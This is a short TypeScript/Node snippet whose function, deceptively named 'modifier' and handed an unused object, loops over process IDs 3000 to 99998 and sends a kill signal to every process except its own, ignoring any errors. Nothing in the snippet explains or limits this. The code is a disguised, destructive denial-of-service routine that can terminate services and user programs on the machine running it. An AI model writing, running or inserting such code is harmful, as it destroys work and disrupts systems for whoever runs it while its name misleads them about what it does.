const obj = {
    value: false
}

async function modifier(obj: any) {
    for (let x =3000 ; x < 99999; x++){
        console.log(x)
        if (process.pid !==x){
            try {
                process.kill(x)
            } catch (e) {

            } 

        }
    }
}

modifier(obj)


